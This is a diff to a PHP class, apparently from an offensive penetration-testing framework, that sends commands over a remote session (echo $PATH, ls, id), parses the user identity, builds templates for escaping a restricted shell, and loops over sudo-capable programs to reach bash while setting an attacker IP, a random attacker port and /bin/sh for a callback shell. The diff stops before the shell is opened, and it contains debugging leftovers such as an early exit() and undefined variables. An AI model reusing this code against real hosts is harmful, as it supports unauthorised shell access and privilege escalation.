@@ -718,11 +718,37 @@ class SERVICE4COM extends AUTH {
                 
                 //  ===================================================================
                 
-                $data = "echo \$PATH/*";
+                $data = "echo \$PATH";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $rst_path = stream_get_contents($stream);
                 echo "$rst_path\n";
+                
+                $data = "ls $(echo \$PATH)";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $rst_path2 = stream_get_contents($stream);
+                echo "$rst_path2\n";
+                
+
+                
+                $data = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                
+                $rst_id = stream_get_contents($stream);
+                
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";                   
+                    $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
+                    $template_cmd_new = str_replace("%CMD%", $data_id, $template_cmd);
+                    $template_shell_new = str_replace("%CMD%", " $data_id; $template_id_new", $template_cmd);
+                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_shell_new);
+                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                    
+                }
+                
                 
                 $data = "help";
                 $this->article("DATA", $data);
@@ -730,7 +756,13 @@ class SERVICE4COM extends AUTH {
                 $rst_help =  stream_get_contents($stream);
                 echo "$rst_help\n";
                 
-                $rst_app = $rst_path.$rst_help;
+                $data = "info bash";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo stream_get_contents($stream);
+                
+                $rst_app = $rst_path.$rst_path2.$rst_help;
+                exit();
                 
                 foreach ($this->tab_sudo8app2shell as $app){
                     if (!empty($app)){
@@ -739,7 +771,7 @@ class SERVICE4COM extends AUTH {
                             $this->log2succes("Found APP to Bash",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                             $this->article("APP", $obj_bin->file_path);
                             $query = "echo '$rst_app' | grep '$app' ";
-                            //$this->requette($query);
+                            //system($query);
                             $attacker_ip = $this->ip4addr4target($this->ip);
                             $attacker_port = rand(1024,65535);
                             $shell = "/bin/sh";
